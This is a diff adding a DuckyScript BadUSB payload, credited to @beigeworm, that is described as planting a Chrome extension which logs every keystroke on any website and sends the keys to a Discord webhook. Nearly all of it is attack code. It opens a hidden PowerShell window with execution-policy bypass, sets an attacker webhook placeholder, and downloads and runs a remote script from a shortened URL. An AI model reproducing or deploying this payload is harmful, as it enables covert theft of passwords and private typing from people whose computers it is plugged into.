@@ -1,0 +1,16 @@
+REM Title: Keylogger To WebHook - Chrome Extension
+REM Author: @beigeworm
+REM Description: Creates the neccessary files for a chrome extension that logs all keystrokes on any website. Then sends the collected keys to a discord webhook.
+REM Target: Windows 10
+REM *SETUP*
+REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://t.ly/rJl5k | iex
+ENTER
